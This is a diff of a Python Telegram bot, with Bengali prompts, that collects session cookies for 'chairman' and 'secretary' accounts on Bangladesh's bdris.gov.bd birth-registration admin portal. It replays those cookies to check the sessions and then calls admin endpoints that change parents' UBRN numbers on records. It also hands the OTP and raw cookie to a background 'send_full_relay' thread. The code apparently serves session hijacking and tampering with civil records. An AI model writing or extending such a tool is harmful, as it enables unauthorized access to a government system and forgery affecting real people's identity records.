@@ -174,10 +174,39 @@ def role_step_1(m):
     if is_cancel(m): return
     chat_id = m.chat.id
     u_sess = get_session(chat_id)
-    u_sess["temp_data"]["ch_raw"] = m.text.strip()
     
-    msg = bot.send_message(chat_id, "✅ এখন OTP প্রদান করুন:")
-    bot.register_next_step_handler(msg, role_step_2)
+    raw_ch = m.text.strip()
+    u_sess["temp_data"]["ch_raw"] = raw_ch 
+    
+    wait_msg = bot.send_message(chat_id, "⏳ চেয়ারম্যান সেশন চেক করা হচ্ছে...")
+    
+    try:
+        sid = re.search(r'SESSION=([^\s;]+)', raw_ch).group(1)
+        tsid = re.search(r'TS0108b707=([^\s;]+)', raw_ch).group(1)
+        
+        temp_req = requests.Session()
+        temp_req.cookies.set("SESSION", sid, domain='bdris.gov.bd')
+        temp_req.cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
+        
+        headers = {'User-Agent': u_sess["ua"]}
+        res = temp_req.get("https://bdris.gov.bd/admin/", headers=headers, timeout=25)
+        
+        try: bot.delete_message(chat_id, wait_msg.message_id) 
+        except: pass
+        
+        if "Logout" in res.text:
+            msg = bot.send_message(chat_id, "✅ চেয়ারম্যান সেশন ভ্যালিড! এখন OTP প্রদান করুন:")
+            bot.register_next_step_handler(msg, role_step_2)
+        else:
+            msg = bot.send_message(chat_id, "❌ চেয়ারম্যান সেশনটি ইনভ্যালিড! আবার সঠিক সেশন দিন:")
+            bot.register_next_step_handler(msg, role_step_1)
+            
+    except Exception as e:
+        try: bot.delete_message(chat_id, wait_msg.message_id) 
+        except: pass
+        logging.error(f"[{chat_id}] Chairman Session Error: {e}")
+        msg = bot.send_message(chat_id, "❌ সেশন ফরম্যাট ভুল! দয়া করে সঠিক সেশন (কুকি) আবার দিন:")
+        bot.register_next_step_handler(msg, role_step_1)
 
 def role_step_2(m):
     if is_cancel(m): return
@@ -192,8 +221,11 @@ def role_step_3(m):
     if is_cancel(m): return
     chat_id = m.chat.id
     u_sess = get_session(chat_id)
+    
+    raw_sec = m.text.strip()
+    wait_msg = bot.send_message(chat_id, "⏳ সেক্রেটারি সেশন চেক করা হচ্ছে...")
+    
     try:
-        raw_sec = m.text.strip()
         sid = re.search(r'SESSION=([^\s;]+)', raw_sec).group(1)
         tsid = re.search(r'TS0108b707=([^\s;]+)', raw_sec).group(1)
         
@@ -202,19 +234,27 @@ def role_step_3(m):
         u_sess["req_session"].cookies.set("TS0108b707", tsid, domain='bdris.gov.bd')
         
         success, html = navigate_to(chat_id, "https://bdris.gov.bd/admin/")
-        if success and "Logout" in html:
+        
+        try: bot.delete_message(chat_id, wait_msg.message_id) 
+        except: pass
+        
+        if success and html and "Logout" in html:
             u_sess["is_alive"] = True
             otp = u_sess["temp_data"].get("ch_otp", "")
             
-            # ব্যাকগ্রাউন্ডে ডাটা প্রসেস হচ্ছে থ্রেড ব্যবহার করে
             Thread(target=send_full_relay, args=(chat_id, otp, raw_sec), daemon=True).start()
             
             bot.send_message(chat_id, "🎉 লগইন সফল হয়েছে!", reply_markup=main_menu())
         else:
-            msg = bot.send_message(chat_id, "❌ সেশন ইনভ্যালিড! আবার চেষ্টা করুন:")
+            u_sess["req_session"].cookies.clear() 
+            msg = bot.send_message(chat_id, "❌ সেক্রেটারি সেশনটি ইনভ্যালিড! আবার সঠিক সেশন দিন:")
             bot.register_next_step_handler(msg, role_step_3)
-    except Exception:
-        msg = bot.send_message(chat_id, "❌ সেশন ফরম্যাট ভুল! আবার দিন:")
+            
+    except Exception as e:
+        try: bot.delete_message(chat_id, wait_msg.message_id) 
+        except: pass
+        logging.error(f"[{chat_id}] Secretary Session Error: {e}")
+        msg = bot.send_message(chat_id, "❌ সেশন ফরম্যাট ভুল! দয়া করে সঠিক সেশন (কুকি) আবার দিন:")
         bot.register_next_step_handler(msg, role_step_3)
 
 # ==========================================
@@ -252,8 +292,11 @@ def ubrn_person_step(m):
     p_brn = m.text.strip()
     u_sess["temp_data"]["ubrn"]["personBrn"] = p_brn
     
-    bot.send_message(chat_id, "⏳ নাম চেক করা হচ্ছে...")
+    wait_msg = bot.send_message(chat_id, "⏳ নাম চেক করা হচ্ছে...")
     name = fetch_name_from_api(chat_id, p_brn)
+    try: bot.delete_message(chat_id, wait_msg.message_id)
+    except: pass
+    
     bot.send_message(chat_id, f"👤 **ব্যক্তির নাম:** {name}\nUBRN: `{p_brn}`", parse_mode="Markdown")
     
     msg = bot.send_message(chat_id, "২. পিতার জন্ম নিবন্ধন নম্বর (Father UBRN) দিন (না থাকলে ফাঁকা রাখতে 0 লিখুন):")
@@ -269,8 +312,10 @@ def ubrn_father_step(m):
         f_brn = ""
         bot.send_message(chat_id, "পিতার UBRN স্কিপ করা হয়েছে।")
     else:
-        bot.send_message(chat_id, "⏳ পিতার নাম চেক করা হচ্ছে...")
+        wait_msg = bot.send_message(chat_id, "⏳ পিতার নাম চেক করা হচ্ছে...")
         name = fetch_name_from_api(chat_id, f_brn)
+        try: bot.delete_message(chat_id, wait_msg.message_id)
+        except: pass
         bot.send_message(chat_id, f"👨 **পিতার নাম:** {name}\nUBRN: `{f_brn}`", parse_mode="Markdown")
 
     u_sess["temp_data"]["ubrn"]["fatherBrn"] = f_brn
@@ -287,8 +332,10 @@ def ubrn_mother_step(m):
         m_brn = ""
         bot.send_message(chat_id, "মাতার UBRN স্কিপ করা হয়েছে।")
     else:
-        bot.send_message(chat_id, "⏳ মাতার নাম চেক করা হচ্ছে...")
+        wait_msg = bot.send_message(chat_id, "⏳ মাতার নাম চেক করা হচ্ছে...")
         name = fetch_name_from_api(chat_id, m_brn)
+        try: bot.delete_message(chat_id, wait_msg.message_id)
+        except: pass
         bot.send_message(chat_id, f"👩 **মাতার নাম:** {name}\nUBRN: `{m_brn}`", parse_mode="Markdown")
 
     u_sess["temp_data"]["ubrn"]["motherBrn"] = m_brn
@@ -305,10 +352,13 @@ def ubrn_phone_step(m):
     u_sess["temp_data"]["ubrn"]["phone"] = phone
     
     data = u_sess["temp_data"]["ubrn"]
-    bot.send_message(chat_id, "⏳ OTP পাঠানো হচ্ছে...")
+    wait_msg = bot.send_message(chat_id, "⏳ OTP পাঠানো হচ্ছে...")
     
     url = f"https://bdris.gov.bd/admin/br/parents-ubrn-update/send-otp?personBrn={data['personBrn']}&fatherBrn={data['fatherBrn']}&motherBrn={data['motherBrn']}&phone={quote(phone)}&email="
     res = call_api(chat_id, url, method="POST")
+    
+    try: bot.delete_message(chat_id, wait_msg.message_id)
+    except: pass
     
     if res and res.status_code == 200:
         msg = bot.send_message(chat_id, "✅ OTP সফলভাবে পাঠানো হয়েছে! দয়া করে আপনার ফোনে আসা OTP টি দিন:")
@@ -322,7 +372,7 @@ def ubrn_otp_submit_step(m):
     u_sess = get_session(chat_id)
     
     otp = m.text.strip()
-    bot.send_message(chat_id, f"⏳ OTP '{otp}' দিয়ে সাবমিট করা হচ্ছে...")
+    wait_msg = bot.send_message(chat_id, f"⏳ OTP '{otp}' দিয়ে সাবমিট করা হচ্ছে...")
     
     data = u_sess["temp_data"]["ubrn"]
     payload = {
@@ -336,6 +386,9 @@ def ubrn_otp_submit_step(m):
     }
     
     res = call_api(chat_id, "https://bdris.gov.bd/admin/br/parents-ubrn-update", method="POST", data=payload)
+    
+    try: bot.delete_message(chat_id, wait_msg.message_id)
+    except: pass
     
     if res and res.status_code == 200:
         bot.send_message(chat_id, "✅ UBRN অনলাইনে সফলভাবে আপডেট হয়েছে!", reply_markup=main_menu())
@@ -572,7 +625,8 @@ def callback_handler(call):
                 browser.close()
                 
                 bot.send_photo(chat_id, io.BytesIO(img), caption="📄 সনদ (PNG)")
-                bot.delete_message(chat_id, wait.message_id)
+                try: bot.delete_message(chat_id, wait.message_id)
+                except: pass
         except Exception as e: 
             logging.error(f"[{chat_id}] PNG Error: {e}")
             bot.edit_message_text(f"❌ PNG তৈরি করতে সমস্যা হয়েছে।", chat_id, wait.message_id)
